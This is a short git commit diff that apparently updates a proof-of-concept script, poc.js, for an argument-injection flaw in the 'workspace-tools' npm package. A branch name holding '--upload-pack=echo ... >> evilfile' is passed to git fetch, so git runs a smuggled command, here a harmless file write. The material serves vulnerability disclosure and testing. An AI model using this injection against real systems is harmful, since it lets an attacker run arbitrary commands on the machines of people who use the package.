4b64c8beb83f0f806677d9025bbd63ece96ebdfc
Martin Thong <martin@scantist.com>
2022-06-21 14:13:35 +0800

    update poc.js to full path

--- poc/poc.js
+++ poc/poc.js
@@ -1,7 +1,7 @@
 const workspace_tools = require("workspace-tools");
 
 workspace_tools.init("./", "username", "password")
-let remoteBranch = "--upload-pack=echo 'some malicious code' >> ~/javascript/poc/evilfile";
+let remoteBranch = "--upload-pack=echo 'some malicious code' >> /home/tester/javascript/poc/evilfile";
 workspace_tools.fetchRemoteBranch("origin", remoteBranch, "./") 
 // git [ "fetch", "origin", "--upload-pack=echo 'some malicious code' >> ~/javascript/poc/evilfile;" ]
 // /root/javascript/poc/evilfile
